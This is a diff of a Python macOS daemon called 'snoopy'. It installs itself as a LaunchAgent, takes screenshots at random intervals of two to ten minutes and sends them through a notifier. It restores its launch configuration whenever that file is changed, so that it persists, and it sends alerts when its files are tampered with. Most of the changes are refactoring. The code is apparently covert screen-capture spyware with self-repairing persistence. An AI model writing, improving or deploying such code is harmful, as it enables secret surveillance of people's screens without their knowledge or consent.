@@ -1,12 +1,12 @@
 #!/usr/bin/env python
 
-import imp
+# import imp
 import sys
 import os
 import time
 import signal
 import random
-import notifier
+from notifier import Notifier
 import subprocess
 from watchdog.observers import Observer
 from watchdog.events import PatternMatchingEventHandler
@@ -17,7 +17,6 @@ from darwin import capture as catcher
 home              = os.getenv("HOME")
 directory         = '{}/code/snoopy'.format(home)
 installation_path = '{}/dist/snoopy'.format(directory)
-debug_file        = '{}/log'.format(directory)
 launchd_path      = '{}/Library/LaunchAgents'.format(home)
 
 
@@ -32,14 +31,9 @@ def get_reloader():
         os.chdir(os.environ['_MEIPASS2'])
         filename = os.path.join(os.environ['_MEIPASS2'], filename)
     else:
-        os.chdir(dirname(sys.argv[0]))
-        filename = os.path.join(dirname(sys.argv[0]), filename)
+        os.chdir(os.path.dirname(sys.argv[0]))
+        filename = os.path.join(os.path.dirname(sys.argv[0]), filename)
     return filename
-
-
-def debug(message):
-    with open(debug_file, 'a') as f:
-        f.write('{}\n'.format(message))
 
 
 def get_plist_filename(s=None):
@@ -79,14 +73,17 @@ class ConfigFileEventHandler(PatternMatchingEventHandler):
             ignore_directories=True)
 
     def on_any_event(self, event):
-        message = "The config file has been tampered with: {}".format(event.src_path)
+        message = """The config file has been tampered with:
+        file: {}""".format(event.src_path)
         self.notifier.send(
-                subject="Alert!",
-                message=message)
+            subject="Alert!",
+            message=message)
         config = ""
-        with open('{}/{}'.format(self.install_dir, self.plist_filename), 'r') as f:
+        install_file = '{}/{}'.format(self.install_dir, self.plist_filename)
+        config_file = '{}/{}'.format(self.launchd_dir, self.plist_filename)
+        with open(install_file, 'r') as f:
             config = f.read().replace("%INSTALL_DIR%", self.install_dir)
-        with open('{}/{}'.format(self.launchd_dir, self.plist_filename), 'w') as f:
+        with open(config_file, 'w') as f:
             f.write(config)
 
 
@@ -99,10 +96,11 @@ class InstallationEventHandler(PatternMatchingEventHandler):
             ignore_directories=True)
 
     def on_any_event(self, event):
-        message = "The installation directory has been tampered with. file: {}".format(event.src_path)
+        message = """The installation directory has been tampered with.
+        file: {}""".format(event.src_path)
         self.notifier.send(
-                subject="Alert!",
-                message=message)
+            subject="Alert!",
+            message=message)
 
 
 class MyDaemon():
@@ -110,18 +108,29 @@ class MyDaemon():
 
     def __init__(self):
         self.killer = GracefulKiller(get_reloader())
-        notifier.send(subject="Starting up")
+        self.notifier = Notifier()
+        self.notifier.send(subject="Starting up")
 
     def run(self):
         self.observer = Observer()
-        config_event_handler = ConfigFileEventHandler(notifier, directory, launchd_path, get_plist_filename())
-        installation_event_handler = InstallationEventHandler(notifier)
-        self.observer.schedule(config_event_handler, launchd_path, recursive=False)
-        self.observer.schedule(installation_event_handler, installation_path, recursive=False)
+        config_event_handler = ConfigFileEventHandler(
+            self.notifier,
+            directory,
+            launchd_path,
+            get_plist_filename())
+        installation_event_handler = InstallationEventHandler(self.notifier)
+        self.observer.schedule(
+            config_event_handler,
+            launchd_path,
+            recursive=False)
+        self.observer.schedule(
+            installation_event_handler,
+            installation_path,
+            recursive=False)
         self.observer.start()
         while True:
-            catcher.capture(directory)
-            notifier.send_screenshots()
+            filenames = catcher.capture(directory)
+            self.notifier.send_screenshots(filenames)
             time.sleep(random.randint(120, 600))
 
 
